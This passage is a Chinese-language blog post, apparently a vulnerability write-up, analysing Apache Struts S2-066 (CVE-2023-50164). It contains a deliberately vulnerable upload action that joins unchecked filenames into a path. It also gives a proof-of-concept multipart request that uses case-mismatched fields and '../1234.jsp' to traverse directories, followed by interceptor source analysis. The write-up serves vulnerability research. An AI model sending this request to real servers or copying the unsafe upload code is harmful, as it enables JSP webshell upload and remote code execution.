@@ -1,0 +1,399 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Apache Struts S2-066 漏洞分析 | ph0ebus&#39;s Blog</title>
+  <meta name="author" content="ph0ebus">
+  
+  <meta name="description" content="Apache Struts 2 S2-066 (CVE-2023-50164)">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Apache Struts S2-066 漏洞分析"/>
+  <meta property="og:site_name" content="ph0ebus&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/search.xml" title="ph0ebus&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.ico" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ph0ebus&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/search.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Apache Struts S2-066 漏洞分析</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> Apache Struts 2 S2-066 (CVE-2023-50164)
+		 </div> <!-- alert -->
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13834">https://xz.aliyun.com/t/13834</a></p>
+<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache Struts 2是一个基于MVC设计模式的Web应用框架，可用于创建企业级Java web应用程序。</p>
+<p>由于文件上传逻辑存在缺陷，威胁者可操纵文件上传参数导致路径遍历，某些情况下可能上传恶意文件，造成远程代码执行。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Struts 2.0.0 - Struts 2.3.37 (EOL)</p>
+<p>Struts 2.5.0 - Struts 2.5.32</p>
+<p>Struts 6.0.0 - Struts 6.3.0</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>和S2-067的环境搭建类似，这里Apache Struts 2漏洞版本选择6.3.0</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>定义UploadAction类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.ph0ebus.s2066.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> File upload;</span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UploadAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(File upload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/tmp/s2066&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> path + File.separator + <span class="built_in">this</span>.uploadFileName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.upload, <span class="keyword">new</span> <span class="title class_">File</span>(realPath));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>配置struts.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;s2066&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.ph0ebus.s2066.action.UploadAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doUpload&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action?uploadFileName=../1234.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure>
+
+<p>使用这个数据包可将上传的文件名覆盖为1234.jsp，并且可以目录穿越</p>
+<p><img src="https://s2.loli.net/2024/12/17/gCPzfkVAom7UlJb.png" alt="img"><img src="https://s2.loli.net/2024/12/17/xyFU5LptNdmTanh.png" alt="img"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>相关的commit在<a target="_blank" rel="noopener" href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p>
+<p>根据这个测试类，可以看出这里和HTTP参数大小写敏感有关，根据函数名可以看出，在get参数时应该大小写敏感，而Append相同参数时忽略大小写</p>
+<p>Struts2本身是有一系列默认拦截器，这部分配置在struts-default.xml中，其中就包含了一个与文件上传相关的拦截器<code>org.apache.struts2.interceptor.FileUploadInterceptor</code></p>
+<p><img src="https://s2.loli.net/2024/12/17/AGKwEnZ4Oqd7Q5T.png" alt="img"></p>
+<p>用一个正常的上传数据包调试</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">hello ph0ebus</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure>
+
+<p>分析一下<code>org.apache.struts2.interceptor.FileUploadInterceptor#intercept</code>这里的逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ActionContext</span> <span class="variable">ac</span> <span class="operator">=</span> invocation.getInvocationContext();</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ac.getServletRequest();</span><br><span class="line">    <span class="keyword">if</span> (!(request <span class="keyword">instanceof</span> MultiPartRequestWrapper)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">ActionProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> invocation.getProxy();</span><br><span class="line">            LOG.debug(<span class="built_in">this</span>.getTextMessage(<span class="string">&quot;struts.messages.bypass.request&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;proxy.getNamespace(), proxy.getActionName()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ValidationAware</span> <span class="variable">validation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">action</span> <span class="operator">=</span> invocation.getAction();</span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">instanceof</span> ValidationAware) &#123;</span><br><span class="line">            validation = (ValidationAware)action;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">MultiPartRequestWrapper</span> <span class="variable">multiWrapper</span> <span class="operator">=</span> (MultiPartRequestWrapper)request;</span><br><span class="line">        <span class="keyword">if</span> (multiWrapper.hasErrors() &amp;&amp; validation != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">TextProvider</span> <span class="variable">textProvider</span> <span class="operator">=</span> <span class="built_in">this</span>.getTextProvider(action);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(LocalizedMessage error : multiWrapper.getErrors()) &#123;</span><br><span class="line">                String errorMessage;</span><br><span class="line">                <span class="keyword">if</span> (textProvider.hasKey(error.getTextKey())) &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(error.getTextKey(), Arrays.asList(error.getArgs()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(<span class="string">&quot;struts.messages.error.uploading&quot;</span>, error.getDefaultMessage());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                validation.addActionError(errorMessage);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">fileParameterNames</span> <span class="operator">=</span> multiWrapper.getFileParameterNames();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(fileParameterNames != <span class="literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">inputName</span> <span class="operator">=</span> (String)fileParameterNames.nextElement();</span><br><span class="line">            String[] contentType = multiWrapper.getContentTypes(inputName);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.isNonEmpty(contentType)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                    LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.content.type&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String[] fileName = multiWrapper.getFileNames(inputName);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.isNonEmpty(fileName)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                        LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.file&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    UploadedFile[] files = multiWrapper.getFiles(inputName);</span><br><span class="line">                    <span class="keyword">if</span> (files != <span class="literal">null</span> &amp;&amp; files.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        List&lt;UploadedFile&gt; acceptedFiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedContentTypes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedFileNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">contentTypeName</span> <span class="operator">=</span> inputName + <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">fileNameName</span> <span class="operator">=</span> inputName + <span class="string">&quot;FileName&quot;</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; files.length; ++index) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="built_in">this</span>.acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) &#123;</span><br><span class="line">                                acceptedFiles.add(files[index]);</span><br><span class="line">                                acceptedContentTypes.add(contentType[index]);</span><br><span class="line">                                acceptedFileNames.add(fileName[index]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!acceptedFiles.isEmpty()) &#123;</span><br><span class="line">                            Map&lt;String, Parameter&gt; newParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                            newParams.put(inputName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>[acceptedFiles.size()])));</span><br><span class="line">                            newParams.put(contentTypeName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedContentTypes.size()])));</span><br><span class="line">                            newParams.put(fileNameName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedFileNames.size()])));</span><br><span class="line">                            ac.getParameters().appendAll(newParams);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拦截器首先获取了<code>ActionContext</code>上下文，然后从上下文中获取<code>HttpServletRequest</code>对象，然后从<code>HttpServletRequest</code>对象中获取文件上传的各个参数。</p>
+<blockquote>
+<p>[File Name] : File - the actual File</p>
+<p>[File Name]ContentType : String - the content type of the file</p>
+<p>[File Name]FileName : String - the actual name of the file uploaded (not the HTML name)</p>
+</blockquote>
+<p>遍历解析每个文件的参数（这里只有一个文件），如果通过<code>acceptFile()</code>方法则将参数塞进<code>org.apache.struts2.dispatcher.HttpParameters#parameters</code>属性中。完成后调用下一个拦截器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!acceptedFiles.isEmpty()) &#123;</span><br><span class="line">    Map&lt;String, Parameter&gt; newParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    newParams.put(inputName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>[acceptedFiles.size()])));</span><br><span class="line">    newParams.put(contentTypeName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedContentTypes.size()])));</span><br><span class="line">    newParams.put(fileNameName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedFileNames.size()])));</span><br><span class="line">    ac.getParameters().appendAll(newParams);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调试跟踪到<code>ac.getParameters().appendAll(newParams);</code>这段代码可以发现端倪.这里将文件上传的参数保存到了<code>org.apache.struts2.dispatcher.HttpParameters</code>对象当中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">appendAll</span><span class="params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.parameters.putAll(newParams);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>既然是<code>HttpParameters#appendAll</code>，结合commit可以看出，这里修改后的代码会忽略大小写，那么漏洞代码则不会忽略大小写，所以可能存在某些变量覆盖的问题</p>
+<p><img src="https://s2.loli.net/2024/12/17/oUBkWsQHCFOVgAN.png" alt="img"></p>
+<p>那么在<code>cn.ph0ebus.s2066.action.UploadAction#setUploadFileName</code>下断点看看调用堆栈</p>
+<p>可以发现调用了<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>，<code>ParametersInterceptor</code>拦截器其主要功能是把<code>ActionContext</code>中的请求参数设置到<code>ValueStack</code>中，如果栈顶是当前Action则把请求参数设置到Action中，如果栈顶是一个model(Action实现了ModelDriven接口)则把参数设置到了model中。这里也就是用于设置<code>UploadAction</code>的参数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 